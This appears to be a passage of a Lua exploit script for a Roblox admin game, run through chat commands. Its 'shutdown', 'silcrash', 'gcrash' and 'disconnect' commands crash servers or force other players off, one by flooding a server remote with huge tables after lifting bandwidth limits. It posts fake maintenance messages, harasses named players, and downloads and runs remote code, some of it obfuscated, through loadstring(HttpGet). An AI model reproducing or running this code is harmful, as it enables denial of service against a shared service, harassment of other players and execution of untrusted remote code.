				game:GetService("Workspace").FallenPartsDestroyHeight = 0/0
				print("Death barrier moved");wait(.65)
				logn("Done")
			elseif msg:lower() == prefix .. "voidbypass" then
				game:GetService("Workspace").FallenPartsDestroyHeight = 0/0
			elseif msg:lower() == prefix .. "unmovedb" then
				game:GetService("Workspace").FallenPartsDestroyHeight = -10001 ;wait(.35)
				logn("Unmoved")
			end

			if msg:lower() == prefix .. "god" then
				logn("Disable antikill before you use this")
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/EFling%20SCV2%20press%20E.lua"),
						true
					)
				)()
			end
			if msg:lower() == prefix .. "fly" then
				chatt("noclip me")
				loadstring(
					game:HttpGet(
						("https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/NA-fly-KAH.lua"),
						true
					)
				)()
			end
			if msg:lower() == prefix .. "shutdown" then
				chatt("/toggle anticrashvg");wait(.1)
				chatt("h \n\n\nServer Message: The server has closed due to maintenance. Error Code 267 \n\n\n")
				chatt("blind all")
				chatt("/regpiss")
				chatt(":gear me "..antilog.."94794847")
				local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
				game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
				for _, v in ipairs(Backpack:GetChildren()) do
					v.Parent = game.Players.LocalPlayer.Character
					v:Activate()
				end

				wait(.35)
				for i = 1, 9 do
					chatt("unsize me me me");task.wait()
				end
				wait(1.5)
				task.spawn(function()
					for i = 1, 99 do
						game.Players:Chat("size all .3")
						game.Players:Chat("size all .3")
						game.Players:Chat("size all .3")
						game.Players:Chat("freeze all")
						game.Players:Chat("size all 10")
						game.Players:Chat("size all 10")
						game.Players:Chat("size all 10")
						game.Players:Chat("clone all")
						wait()
					end
				end)

				wait(.65)

				for i = 1, 2 do
					local table1 = {}
					local table2 = {}

					local function loop(v1, v2)
						for i = v1, v2 do
							table.insert(table1, table2)
						end
					end

					local function crash(v1)
						for i = 1, v1 do
							table.insert(table2[1], {})
						end

						if 4999999 / (v1 + 2) then
							loop(1, 4999999 / (v1 + 2))
						else
							loop(1, 4999999)
						end
						game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
					end

					table.insert(table2, {})
					game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
					crash(250)
				end
			end
			if msg:lower() == prefix .. "tempcrash" then
				chatt("unchar random")
				chatt("size all 0.3")
				chatt("size all 0.3")
				chatt("size all 0.3")
				chatt("freeze all")
				chatt("size all 10")
				chatt("size all 9.9")
				chatt("size all 9.9")
				chatt("clone all")
				chatt("size all 0.3")
				chatt("size all 0.3")
				chatt("size all 0.3")
				chatt("freeze all")
				chatt("size all 10")
				chatt("size all 9.9")
				chatt("size all 9.9")
				chatt("clone all")
				chatt("size all 10")
				chatt("size all 9.9")
				chatt("size all 9.9")
				chatt("freeze all")
				chatt("size all 10")
				chatt("size all 9.9")
				chatt("size all 9.9")
				chatt("clone all")
				chatt("gear me "..antilog.."94794847")
				wait()
				chatt("gear me "..antilog.."94794847")
			end
			if msg:lower() == prefix .. "silcrash" then
				print("Silent Crashing with infinite yield loaded up is way faster, due to it having a faster usetools")
				game.Players:Chat("/toggle anticrashvg")
				--logn("Wait for about 20-30 seconds before leaving")
				game.Players:Chat(prefix.."voidbypass")
				game.Players:Chat("yesvg")
				chatt("size me .3")
				chatt("size me .3")
				chatt("size me .3")
				chatt("unchar random")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("size others 10")
				chatt("size others 9.9")
				chatt("size others 9.9")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("size others 10")
				chatt("size others 9.9")
				chatt("size others 9.9")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("size others 10")
				chatt("size others 9.9")
				chatt("size others 9.9")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("size others 10")
				chatt("size others 9.9")
				chatt("size others 9.9")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 10")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 9.9")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 9.9")
				chatt("gear me "..antilog.."94794847")
				game.Players:Chat("/alltools")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("size others 10")
				chatt("size others 9.9")
				chatt("size others 9.9")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 10")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 9.9")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 9.9")
				chatt("gear me "..antilog.."94794847")
				game.Players:Chat("/alltools")
				chatt("clone others")
				chatt("clone others")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("size others 0.3")
				chatt("freeze others")
				game.Players:Chat("/alltools")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 10")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 9.9")
				chatt("gear me "..antilog.."94794847")
				chatt("size others 9.9")
				chatt("gear me "..antilog.."94794847")
				chatt("clone others")
				game.Players:Chat("/alltools")
				execCmd("equiptools")
				logn("Wait for about 20-30 seconds before leaving")
				chatt("gear me "..antilog.."94794847")
				chatt("undog me me")
				chatt("normal me me");wait(4.65)

				for i = 1, 200 do
					for i = 1, 3 do
						chatt("size others 0.3")
						game.Players:Chat("/alltools")
						chatt("gear me 94794847")
						execCmd("equiptools")
					end
					chatt("freeze others")
					for i = 1, 3 do
						chatt("size others 9.9")
						game.Players:Chat("/alltools")
						chatt("gear me 94794847")
						execCmd("equiptools")
					end
					logn("Server should almost be fully crashed :)")
					chatt("clone others")
					task.wait()
					chatt("undog me me")
					chatt("gear me 94794847")
					chatt("undog me me")
					execCmd("equiptools")
					game.Players:Chat("/alltools")
					chatt("punish others")
				end
				logn("SERVER DISCONNECTED, soz for the lag")
			end
			if msg:lower() == prefix .. "startup" then
				task.wait(5)
				game.Players:Chat(prefix.."bccheck")
				--game.Players:Chat(prefix.."sloccheck")
				task.wait();chatt(shared.startupcmd1)
				task.wait();chatt(shared.startupcmd2)
				task.wait();chatt(shared.startupcmd3)
				task.wait();chatt(shared.startupcmd4)
				task.wait();chatt(shared.startupcmd5)
				task.wait();chatt(shared.startupcmd6)
				task.wait();chatt(prefix.."optionalstartup")
			elseif msg:lower() == prefix .. "optionalstartup" then
				task.wait()
				task.wait();chatt(shared.startupcmd7)
				task.wait();chatt(shared.startupcmd8)
				task.wait();chatt(shared.startupcmd9)
				task.wait();chatt(shared.startupcmd10)
				task.wait();chatt(shared.startupcmd11)
				task.wait();chatt(shared.startupcmd12)
				task.wait();chatt(prefix.."makecstartup")
				if shared.startupcmd13 then
					game:shutdown()
				end
			end
			if string.sub(msg:lower(), 0, 7) == prefix .. "fixbp" then
				chatt("/toggle antivoid")
				chatt("invis Baseplate me")
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 2006, 90));task.wait(.25) -- Looking for the bp
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 4006, 90));task.wait(.25)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 6006, 90));task.wait(.25)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 8006, 90));task.wait(.25)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-31, 10006, 90));task.wait(.25)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(9999, 6666, 6969));task.wait(.35)
				chatt("gear me "..antilog.."108158379");wait()
				local function L_1_func()
					repeat wait()
					until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
					game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
				end
				local function L_2_func()
					repeat wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							L_13_.CFrame = game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.CFrame * CFrame.new(-1 * (game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
							if not L_14_ then
								break
							end
						end
					end)
					task.spawn(function()
						while L_14_ do
							game:GetService('RunService').Heartbeat:Wait()
							chatt("unpunish me "..math.random(1,1000))
						end
					end);wait(0.3)
					L_14_ = false
				end
				local L_3_ = math.random(1, 2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-501, 0.101, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
				game.Workspace.Gravity = 0
				task.wait(.25)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				task.wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				chatt("gear me "..antilog.."108158379")
				L_1_func();wait(.35)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-501, 0.101, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				local L_4_ = {
					[1] = Enum.KeyCode.E
				}

				game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-501, 0.101, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
				repeat task.wait()
				until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				chatt("unfly me");wait(.2)
				repeat
					L_2_func()

				until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()

				local L_5_ = {
					[1] = Enum.KeyCode.E
				}

				game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
				repeat wait()
				until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")

				game.Players.LocalPlayer.Character:Destroy()
				chatt("/toggle antivoid")
				L_1_func();wait(.35)
				local L_6_ = {
					[1] = Enum.KeyCode.E
				}

				game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
				repeat wait()
				until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
				for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
					if L_16_forvar1.Name == "FakeCharacter" then
						L_16_forvar1:Destroy()
					end
				end
				local L_7_ = game:GetService("Workspace").Terrain["_Game"]
				local L_8_ = L_7_.Workspace
				local L_9_ = L_7_.Admin
			end
			--game.Players.LocalPlayer.Character:Destroy()
			if string.sub(msg:lower(), 0, 9) == prefix .. "breakbp" then
				chatt("gear me "..antilog.."108158379");wait()
				local function L_1_func()
					repeat wait()
					until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
					game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
				end
				local function L_2_func()
					repeat wait()
					until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
					task.spawn(function()
						while true do
							game:GetService('RunService').Heartbeat:Wait()
							game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
							L_13_.CFrame = game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.CFrame * CFrame.new(-1 * (game:GetService("Workspace").Terrain._Game.Workspace.Baseplate.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);wait()
							if not L_14_ then
								break
							end
						end
					end)
					task.spawn(function()
						while L_14_ do
							game:GetService('RunService').Heartbeat:Wait()
							chatt("unpunish me "..math.random(1,1000))
						end
					end);wait(0.3)
					L_14_ = false
				end
				local L_3_ = math.random(1, 2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(9999, 6666, 6969))
				game.Workspace.Gravity = 0
				task.wait(.25)
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				task.wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				chatt("gear me "..antilog.."108158379")
				L_1_func();wait(.35)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(9999, 6666, 6969))
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				local L_4_ = {
					[1] = Enum.KeyCode.E
				}

				game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(9999, 6666, 6969))
				repeat wait()
				until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				chatt("unfly me");wait(.2)
				repeat
					L_2_func()

				until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");wait()

				local L_5_ = {
					[1] = Enum.KeyCode.E
				}

				game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
				repeat wait()
				until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")

				game.Players.LocalPlayer.Character:Destroy()
				chatt(prefix.."breakcam");wait()
				chatt("fogend -");wait()
				chatt("flash");wait()
				chatt("music "..antilog.."1838663141");wait()
				L_1_func();wait(.35)
				local L_6_ = {
					[1] = Enum.KeyCode.E
				}

				game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
				repeat wait()
				until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
				for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
					if L_16_forvar1.Name == "FakeCharacter" then
						L_16_forvar1:Destroy()
					end
				end
				local L_7_ = game:GetService("Workspace").Terrain["_Game"]
				local L_8_ = L_7_.Workspace
				local L_9_ = L_7_.Admin
			end
			--game.Players.LocalPlayer.Character:Destroy()
			if msg:lower() == prefix .. "ivory" then
				chatt("gear me "..antilog.."108158379")
			end
			if msg:lower() == prefix .. "periastron" then
				logn("Wait a bit")
				chatt("gear me "..antilog.."159229806");wait(1.5)
				chatt("gear me "..antilog.."233520257")
				chatt("gear me "..antilog.."120307951");wait(2.5)
				chatt("gear me "..antilog.."80661504")
				chatt("gear me "..antilog.."93136802");wait(.35)
				chatt("gear me "..antilog.."99119240")
				chatt("gear me "..antilog.."73829193");wait(.65)
				chatt("gear me "..antilog.."139577901")
				chatt("gear me "..antilog.."2544549379");wait(3)
			end

			-- A portion of the regen finder [findregen2]
			if msg:lower() == prefix .. "cframelocatereg" then
				logn("Scanning every possible edgecoord")
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000003, -1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1101734, 33651680, -33531784));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000003, -1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000000, -3));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(3, -1000000, 1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -3, -1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, -3, 1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 3, 1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, 1000003, 1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1000000, -1000003, 1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(454545, 150000, -678678));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(306712, 420552, 398158));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, 1000003, 1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, 1000003, -1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-1000000, -1000003, -1000000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(45400, -49860, 56673));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(56470, -48312, 28578));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(75304, -49638, 47300));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(34120, -48830, 30233));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(77822, -49751, 79116));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(42682, -29202, 29886));wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(51052, -49558, 34068));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-200000, 50000, 3500000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(782629, 385179, 234698));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-251773, 1000003, 382563));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500000, 300000, 500000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-300000, 300000, 300000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(300000, 300000, 300000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(300000, 300000, -300000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-300000, 300000, -300000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-500000, 300000, 500000));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-7, 12009, 95));game:GetService("RunService").RenderStepped:wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(734399, 560502, 2776));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-360263, 421796, 716100));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999982, 3143, 999997));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(696973, 999997, -1000001));wait(.15)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000, 10000, 100000));wait(.35)
				game.Players.LocalPlayer.Character:Destroy()
			end
			if msg:lower() == prefix .. "rej" then
				game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
			end
			if msg:lower() == prefix .. "rj" then
				game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
			end

			--// GUI Commands \\--
			if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "spam" then
				local msggg = string.sub(msg:lower(), 6 + #prefix)
				spam = true
				while spam do
					task.wait()
					chatt(msggg)
				end
			end

			if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "hint" then
				local msggg = string.sub(msg:lower(), 6 + #prefix)
				chatt("fogend nil moment")
				for i = 1, 6 do
					chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n "..msggg);Utils:__wait()
				end
				wait(5)
				chatt("undisco instead of fix cus yes")
			end

			if string.sub(msg:lower(), 0, 9 + #prefix) == prefix .. "ungearban" then
				local msggg = string.sub(msg:lower(), 11 + #prefix)
				game.Players:Chat("yesvg")
				game.Players:Chat("/toggle anticrashvg");wait(1)
				chatt("gear me "..antilog.."94794847")
				chatt("tp "..msggg.." me")
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.VampireVanquisher);wait(.65)
				game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.Q,false,game);wait(1.35)
				longlogn("This can undo the /bangears command")
				chatt("ungear me");wait(1)
				game.Players:Chat("/toggle anticrashvg")
			end

			if msg:lower()==prefix.."gwelcomeinput perm"then perm=true elseif msg:lower()==prefix.."gwelcomeinput perm2"then game.Players:Chat("/perm")elseif msg:lower()==prefix.."gwelcomeinput logs"then local b=Instance.new("Sound")b.SoundId="http://www.roblox.com/asset/?id=5807619699"b.Volume=1.5;b.Parent=workspace;b.PlaybackSpeed=1;b:Play()wait()chatt("Logs are annoying at times ngl.")task.wait(.65)pcall(function()game.Players.LocalPlayer.PlayerGui.ScrollGui.TextButton.Frame.Size=UDim2.new(3,t,1000,j)end)if shared.firsttimecheckpassed==true then if glogsglobal==true then pass()return end;pcall(function()getgenv().glogsglobal=true end)longlogn("Ah, the logs. Sometimes you just need to know what someone is doing, riiighhtt???")end elseif msg:lower()==prefix.."gantisinput antispeed"then pcall(function()if antiSpeed==true then antiSpeed=false end end)antiSpeed=true elseif msg:lower()==prefix.."gantisinput god mode"then pcall(function()if ELFRGD==true then ELFRGD=false end end)ELFRGD=true elseif msg:lower()==prefix.."gantisinput antisetgrav"then pcall(function()if antiSetgrav==true then antiSetgrav=false end end)antiSetgrav=true elseif msg:lower()==prefix.."gantisinput antinoclip"then antinoclip()elseif msg:lower()==prefix.."gantisinput antiattach"then pcall(function()if antiattach==true then antiattach=false end end)antiattach=true elseif msg:lower()==prefix.."gemrinput forcethrough"then game.Players:Chat(prefix.."emergencymode1")elseif msg:lower()==prefix.."gbuildsinput f3x instead of btools"then game.Players:Chat(prefix.."effex")elseif msg:lower()==prefix.."gemrinput server lock"then game.Players:Chat(prefix.."permaslock")elseif msg:lower()==prefix.."gemrinput testgrab"then game.Players:Chat(prefix.."testgrab")elseif msg:lower()==prefix.."gothersinput scramble"then game.Players:Chat(prefix.."scramble")elseif msg:lower()==prefix.."gothersinput clicktp"then game.Players:Chat("/clicktp")elseif msg:lower()==prefix.."gothersinput iy"then game.Players:Chat(prefix.."infyield")elseif msg:lower()==prefix.."gothersinput silent crash"then game.Players:Chat(prefix.."silcrash")elseif msg:lower()==prefix.."gothersinput shutdown"then game.Players:Chat(prefix.."shutdown")elseif msg:lower()==prefix.."gothersinput load pads"then chatt(prefix.."spam /skydive "..math.random(1,1000))wait(3.5)chatt("/pads")wait(.5)chatt(prefix.."stop")wait(4.5)chatt("/pads")chatt("setgrav me -9e9")wait()chatt("/pads")chatt("/perm")wait()chatt("/pads")wait()chatt("/pads")wait(3.5)chatt("unchar me")if shared.firsttimecheckpassed==true then longlogn("If you cannot get a pad because the admin pads are missing, you can use this command to try to load them")end end

			-- // END OF GUI INPUT SECTION \\ --
			if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "tspam" then
				local msggg = string.sub(msg:lower(), 7 + #prefix)
				spam = true
				while spam do
					wait(6.5)
					chatt(msggg)
				end
			end
			if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "annoy" then
				local msggg = string.sub(msg:lower(), 7 + #prefix)
				spam = true
				while spam do
					wait(0.8)
					chatt("reset " .. msggg .. " " .. math.random(1, 1000));wait(0.2)
					chatt("sit " .. msggg .. " " .. math.random(1, 1000))
				end
			end

			if string.sub(msg:lower(), 0, 9 + #prefix) == prefix .. "hairdryer" then
				local msggg = string.sub(msg:lower(), 11 + #prefix)
				antiFun = false
				antigear = false
				chatt(prefix.."infyield");wait()
				chatt("h/ \n\n\nCurrently drying hair because I can\n\n\n")
				chatt("h \n\n\n Server Message: Currently drying hair because I can\n\n\n")
				chatt("invis capybara_" .. msggg);wait(.1)
				chatt("fly alex "..math.random(1, 327670000).." " .. msggg)
				chatt("undog alex "..math.random(1, 327670000).." " .. msggg)
				chatt("normal alex "..math.random(1, 327670000).." " .. msggg)
				chatt("unsize alex "..math.random(1, 327670000).." " .. msggg)
				chatt("uncreeper alex "..math.random(1, 327670000).." " .. msggg)
				chatt("ungear me | " .. msggg);wait(.35)
				chatt("gear me "..antilog.."55028088")
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait()
				chatt("noclip alex "..math.random(1, 327670000).." " .. msggg)
				chatt("size " .. msggg .. " nan");wait(0.8)
				execCmd("view "..msggg)
				execCmd("fasttp " .. msggg .. " "..game.Players.LocalPlayer.Name)
				chatt("gear "..msggg.." "..antilog.."110337853")
			end

			if string.sub(msg:lower(), 0, 10 + #prefix) == prefix .. "disconnect" then
				local msggg = string.sub(msg:lower(), 12 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				chatt("unchar " .. msggg);task.wait(.5)
				chatt("/toggle anticrashvg")
				chatt("blind " .. msggg)
				task.wait(0.8)
				chatt("noclip " .. msggg .. "");wait(0.35)
				chatt("size " .. msggg .. " nan");wait(0.8)
				chatt("gear " .. msggg .. " "..antilog.."159229806");wait(1.5)
				chatt("gear " .. msggg .. " "..antilog.."233520257")
				chatt("gear " .. msggg .. " "..antilog.."120307951");wait(2.5)
				chatt("gear " .. msggg .. " "..antilog.."80661504")
				chatt("gear " .. msggg .. " "..antilog.."93136802");wait(.35)
				chatt("gear " .. msggg .. " "..antilog.."99119240")
				chatt("gear " .. msggg .. " "..antilog.."73829193");wait(.65)
				chatt("gear " .. msggg .. " "..antilog.."139577901")
				chatt("gear " .. msggg .. " "..antilog.."94333296")
				chatt("gear " .. msggg .. " "..antilog.."94333296")
				chatt("gear " .. msggg .. " "..antilog.."94794847")
				chatt("gear " .. msggg .. " "..antilog.."2544549379");wait(3)
				temploopgrab = false
				chatt(prefix.."spam gear " .. msggg .. " "..antilog.."253519495");wait(14.65) -- Perfect time literally
				for i = 1, 5 do
					chatt(prefix.."stop");wait(1)
				end
			end
			if string.sub(msg:lower(), 0, 6 + #prefix) == prefix .. "gcrash" then
				local msggg = string.sub(msg:lower(), 8 + #prefix)
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/zoomer-Auto-Report'),true))()
				chatt("m This may be a Temp crash, don't leave yet");task.wait()
				chatt("unchar " .. msggg);task.wait(1.5)
				chatt("unchar " .. msggg);task.wait(.5)
				chatt("_bn " .. msggg);task.wait(.5)
				chatt("pm "..msggg.." Kicked by SC");task.wait(.65)
				chatt("gear "..msggg.." 25741198")
				chatt("gear "..msggg.." 25741198")
				chatt("pm/"..msggg.." Kicked by SC \n Don't abuse next time")
				chatt("//super explode "..msggg);wait(1.35)
				chatt("pm/"..msggg.." Kicked by SC \n Don't abuse next time")
				chatt(prefix.."tempcrash")
				chatt("/toggle anticrashvg");wait(5.5)
				chatt(".run");wait(1)
				chatt("thaw all")
				chatt("removeclones")
				longlogn("Person 299's admin is highly recommended. Type //stop after this message ends if you don't have it")
				chatt(prefix.."personslag  "..msggg);wait(53.5)
				logn("Auto rejoining in about a minute");wait(60)
				rejoin()
			end
			if string.sub(msg:lower(), 0, 6 + #prefix) == prefix .. "harddc" then
				local msggg = string.sub(msg:lower(), 8 + #prefix)
				temploopgrab = true
				antiFun = false
				antigear = false
				chatt(prefix.."infyield");wait(.65)
				chatt("fly me")
				chatt("ff all")
				regen()
